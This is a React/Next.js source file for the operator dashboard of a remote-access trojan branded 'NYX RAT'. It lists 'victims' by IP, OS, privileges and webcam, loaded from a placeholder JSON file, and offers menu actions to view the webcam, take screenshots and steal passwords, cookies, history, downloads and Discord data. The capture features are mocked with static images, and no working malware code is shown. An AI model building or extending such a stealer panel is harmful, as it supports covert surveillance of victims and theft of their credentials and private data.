'use client'
import { useState, useEffect, useRef, MouseEvent } from 'react'
import Image from 'next/image'
import { Menu, X } from 'lucide-react'
import logo from '@/assets/logo.png'
import prtsc from '@/assets/screenshot.png'
import webcam from '@/assets/webcam.gif'
import { HereBackgroundGradientAnimation } from "./ui/background-gradient-animation";
import { useParams } from 'next/navigation'
import Footer from './footer/footer'
import Data from '@/data/teste.json';
import {Modal} from '@/components/Modal/modal'


interface User {
  id: number;
  ip: string;
  name: string;
  username: string;
  hostname: string;
  version: string;
  location: string;
  os: string;
  privileges: string;
  currentWindow: string;
  hasWebcam: boolean;
  system: string;
  architecture: string;
  cpu: string;
  gpu: string;
  ram: string;
  hwid: string;
  country: string;
  region: string;
  city: string;
  cep: string;
  isp: string;
  networkDetails: {
    macAddress: string;
    subnetMask: string;
    gateway: string;
    dns: string[];
  };
  cookies: {
    sessionId: string;
    authToken: string;
    preferences: {
      theme: string;
      language: string;
    };
    expiration: string;
  };
  downloads: {
    fileName: string;
    fileSize: string;
    downloadDate: string;
  }[];
  passwords: {
    website: string;
    username: string;
    password: string;
  }[];
}
const users: User[] = Data;

interface networkDetails {
  macAdress: string;
  subnetMask: string;
  gateway: string;
  dns: string;
}


interface ContextMenuState {
  visible: boolean;
  x: number;
  y: number;
  userId: number | null;
}

interface SubMenuState {
  visible: boolean;
  x: number;
  y: number;
}


export default function Component() {
  const [isMenuOpen, setIsMenuOpen] = useState(false)
  const [contextMenu, setContextMenu] = useState<ContextMenuState>({ visible: false, x: 0, y: 0, userId: null })
  const [subMenu, setSubMenu] = useState<SubMenuState>({ visible: false, x: 0, y: 0 })
  const contextMenuRef = useRef<HTMLDivElement>(null)
  const subMenuRef = useRef<HTMLDivElement>(null)
  const [selectedUserId, setSelectedUserId] = useState<number | null>(null)
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [isWebcamModalOpen, setIsWebcamModalOpen] = useState(false);
  const [isScreenshotModalOpen, setIsScreenshotModalOpen] = useState(false);
  const [webcamImage, setWebcamImage] = useState<string | null>(null);
  const [screenshotImage, setScreenshotImage] = useState<string | null>(null);
  const [openPassowrd, setIsOpenPassowrd] = useState(false);
  const [openCookie ,setIsOpenCookie] = useState(false);
  const [openDownloads, setIsOpenDownloads] = useState(false);






  const userInfo = {
    name: 'Faccin',
    registeredDate: '2023-01-15',
    expiryDate: '2038-01-15'
  }


  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (contextMenuRef.current && !contextMenuRef.current.contains(event.target as Node)) {
        setContextMenu({ visible: false, x: 0, y: 0, userId: null })
      }
      if (subMenuRef.current && !subMenuRef.current.contains(event.target as Node)) {
        setSubMenu({ visible: false, x: 0, y: 0 })
      }
    }

    document.addEventListener('mousedown', handleClickOutside as unknown as EventListener)
    return () => {
      document.removeEventListener('mousedown', handleClickOutside as unknown as EventListener)
    }
  }, [])

  const handleContextMenu = (e: React.MouseEvent, userId: number) => {
    e.preventDefault()
    setContextMenu({ visible: true, x: e.clientX, y: e.clientY, userId })
    setSubMenu({ visible: false, x: 0, y: 0 })
  }
  const handleCloseModal = () => {
    setIsModalOpen(false);
}

  const handleSubMenuHover = (e: React.MouseEvent<HTMLDivElement>) => {
    const rect = e.currentTarget.getBoundingClientRect()
    setSubMenu({ visible: true, x: rect.right, y: rect.top })
  }

  const handleUserClick = (userId: number) => {
    setSelectedUserId(userId === selectedUserId ? null : userId)
  }

  const handleOpenModal = () => {
    setIsModalOpen(true);
    setContextMenu({ visible: false, x: 0, y: 0, userId: null });
  }

 
  const handleOpenWebcamModal = () => {
    setIsWebcamModalOpen(true);
    setContextMenu({ visible: false, x: 0, y: 0, userId: null });
    setWebcamImage(webcam.src); 
  }

  const handleCloseWebcamModal = () => {
    setIsWebcamModalOpen(false);
    setWebcamImage(null);
  }

  const handleOpenScreenshotModal = () => {
    setIsScreenshotModalOpen(true);
    setContextMenu({ visible: false, x: 0, y: 0, userId: null });
    setScreenshotImage(prtsc.src); 
  }

  const handleCloseScreenshotModal = () => {
    setIsScreenshotModalOpen(false);
    setScreenshotImage(null);
  }

  

  interface ImageModalProps {
    isOpen: boolean;
    onClose: () => void;
    title: string;
    imageSrc: string | null;
  }
 
  
  

const ImageModal: React.FC<ImageModalProps> = ({ isOpen, onClose, title, imageSrc }) => {
  if (!isOpen || !imageSrc) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center z-50">
      <div className="bg-zinc-800 p-6 rounded-md text-white w-10/12 max-w-4xl h-4/5 overflow-y-auto flex flex-col items-center relative">
        <div className="absolute inset-0 flex items-center justify-center opacity-[2%] pointer-events-none">
          <Image src={logo} alt="Nyx Logo" width={700} height={700} />
        </div>
        <button onClick={onClose} className="self-start text-red-700">
          CLOSE
        </button>
        <h2 className="text-3xl font-bold text-center mb-4">{title}</h2>
        <div className="flex-grow flex items-center justify-center">
          <img src={imageSrc} alt={title} className="max-w-full max-h-full" />
        </div>
      </div>
    </div>
  );
};



  function ContextMenu() {
    {setOpenPassowrd: {users.map((user)=>(
    <div key={user.id}>
      <h2>Passowrd:</h2>
      <br />
      <ul>
        <li>
          {user.name}
        </li>
      </ul>
    </div>
    ))}}
    return(
    <div
      ref={contextMenuRef}
      className="absolute bg-zinc-800 border border-zinc-700 rounded shadow-lg py-1 z-50"
      style={{ top: `${contextMenu.y}px`, left: `${contextMenu.x}px` }}
    >
      <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer" onClick={handleOpenModal}><abbr title="Here you can take the victim information" >GET Victim Information</abbr></div>
      <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer" onClick={handleOpenWebcamModal}><abbr title="Here you can take a picture from the victim" >GET Webcam Live</abbr></div>
      <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer" onClick={handleOpenScreenshotModal}><abbr title="Here you can take a print from the victim" >GET Screnn Shot</abbr></div>
      <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer relative" onMouseEnter={handleSubMenuHover}>
        Stealer Options ▶
        {subMenu.visible && (
          <div
            ref={subMenuRef}
            className="absolute bg-zinc-800 border border-zinc-700 rounded shadow-lg py-1"
            style={{ top: '0', left: '100%', minWidth: 250 }}
          >
            <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer">
              <abbr className='no-underline' title='Here you can steal the user Passwords'><button onClick={()=> setIsOpenPassowrd(true)}> <p>Steal Passwords</p> </button></abbr>
            </div>
            <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer"><abbr  title='Here you can steal the victmin Cookies'>Steal Cookies</abbr></div>
            <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer"><abbr  title='Here you can steal the victmin History'>Steal History</abbr></div>
            <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer"><abbr  title='Here you can steal the victmin Downloads'>Steal Downloads</abbr></div>
            <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer"><abbr  title='Here you can steal the victmin Discord'>Steal Discord</abbr></div>
          </div>
        )}
      </div>
      {/* O onclick para deletar o user vai ficar aqui */}
      <div className="px-4 py-2 hover:bg-zinc-700 text-red-500 cursor-pointer">
        <button
        
        >
       Remove Victim
        </button>
        
        
        </div>
    </div>
    )
}
  
  return (
    <HereBackgroundGradientAnimation>      
    <div className="min-h-screen  text-white flex flex-col relative">
      <div className="absolute inset-0 flex items-center justify-center opacity-5 pointer-events-none">
        <Image
          src={logo}
          alt="Nyx Logo"
          width={700}
          height={700}
        />
      </div>

      <header className="p-4 flex justify-between items-center relative z-10">
        <div className="flex items-center space-x-2">
        </div>
        <h1 className="text-xl sm:text-2xl font-bold">
          <span className="text-zinc-400">NYX</span> RAT
        </h1>
        <button
          onClick={() => setIsMenuOpen(!isMenuOpen)}
          className="p-2 sm:hidden"
        >
          <Menu className="h-6 w-6" />
        </button>
        <div className="hidden sm:flex items-center space-x-2">
          <div className="text-xs">
            <p>{userInfo.name}</p>
            <p>Registered: {userInfo.registeredDate}</p>
            <p>Expiry: {userInfo.expiryDate}</p>
          </div>
        </div>
      </header>

      {/* celular hamburguer */}
      {isMenuOpen && (
        <div className="fixed inset-y-0 right-0 w-64 bg-zinc-800 p-4 z-20 sm:hidden">
          <div className="flex items-center space-x-4 mb-4">
            <div className="w-12 h-12 bg-gray-600 rounded-full"></div>
            <div>
              <p className="font-medium">{userInfo.name}</p>
              <p className="text-sm text-zinc-400">Registered: {userInfo.registeredDate}</p>
              <p className="text-sm text-zinc-400">Expiry: {userInfo.expiryDate}</p>
            </div>
          </div>
          <button
            onClick={() => setIsMenuOpen(false)}
            className="absolute top-4 right-4 text-white"
          >
            &times;
          </button>
        </div>
      )}

<main className="flex-grow p-4 flex flex-col items-center relative z-10">
        <div className="w-full overflow-x-auto">
          <table className="w-full mb-8 border-collapse">
            <thead>
              <tr className="bg-zinc-800">
                <th className="px-2 py-1 sm:px-4 sm:py-2 text-left">IP</th>
                <th className="px-2 py-1 sm:px-4 sm:py-2 text-left">Client Name</th>
                <th className="px-2 py-1 sm:px-4 sm:py-2 text-left">Username</th>
                <th className="px-2 py-1 sm:px-4 sm:py-2 text-left">Version</th>
                <th className="px-2 py-1 sm:px-4 sm:py-2 text-left">Location</th>
                <th className="px-2 py-1 sm:px-4 sm:py-2 text-left">OS</th>
                <th className="px-2 py-1 sm:px-4 sm:py-2 text-left">Privileges</th>
                <th className="px-2 py-1 sm:px-4 sm:py-2 text-left">Current Window</th>
                <th className="px-2 py-1 sm:px-4 sm:py-2 text-left">Webcam</th>
              </tr>
            </thead>
            <tbody>
              {users.map(user => (
                  <tr
                    key={user.id} 
                    className={`border-b border-zinc-700 transition-colors duration-200 hover:bg-purple-800 hover:bg-opacity-40 bg-opacity-30`}
                    onClick={() => handleUserClick(user.id)}
                    onContextMenu={(e) => handleContextMenu(e, user.id)}
                  >
                    <td className="px-2 py-1 sm:px-4 sm:py-2 ">{user.ip}</td>
                    <td className="px-2 py-1 sm:px-4 sm:py-2">{user.name}</td>
                    <td className="px-2 py-1 sm:px-4 sm:py-2">{user.username}</td>
                    <td className="px-2 py-1 sm:px-4 sm:py-2">{user.version}</td>
                    <td className="px-2 py-1 sm:px-4 sm:py-2">{user.location}</td>
                    <td className="px-2 py-1 sm:px-4 sm:py-2">{user.os}</td>
                    <td className="px-2 py-1 sm:px-4 sm:py-2">{user.privileges}</td>
                    <td className="px-2 py-1 sm:px-4 sm:py-2">{user.currentWindow}</td>
                    <td className="px-2 py-1 sm:px-4 sm:py-2">{user.hasWebcam ? 'Yes' : 'No'}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </main>

      <Footer/>
    </div>
    
    {contextMenu.visible && <ContextMenu />}
      {isModalOpen && <Modal children={(
        <button onClick={handleCloseModal} className="self-start text-red-700">
        CLOSE
      </button>)}
      />}
      {isWebcamModalOpen && (
        <ImageModal
          isOpen={isWebcamModalOpen}
          onClose={handleCloseWebcamModal}
          title="LIVE"
          imageSrc={webcamImage}
        />
      )}
      {isScreenshotModalOpen && (
        <ImageModal
          isOpen={isScreenshotModalOpen}
          onClose={handleCloseScreenshotModal}
          title="Screenshot"
          imageSrc={screenshotImage}
        />
      )}
    </HereBackgroundGradientAnimation>
  )
}